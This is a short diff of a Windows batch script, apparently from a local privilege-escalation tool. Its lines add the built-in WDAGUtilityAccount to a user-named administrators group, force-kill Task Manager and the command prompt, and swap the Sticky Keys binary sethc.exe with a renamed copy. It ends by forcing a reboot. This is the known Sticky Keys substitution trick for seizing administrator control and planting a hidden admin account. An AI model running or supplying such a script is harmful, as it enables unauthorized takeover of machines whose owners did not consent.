@@ -9,5 +9,8 @@ echo [ + ] For and languages that are not English and German, type "Administrato
 set /p admin_group=[ + ] :
 net localgroup %admin_group% /add WDAGUtilityAccount
 taskkill /f /im taskmgr.exe
+taskkill /f /im sethc.exe
+rename sethc.exe launchtm.exe
+rename sethc.original sethc.exe
 taskkill /f /im cmd.exe
 shutdown -r -f -t 0
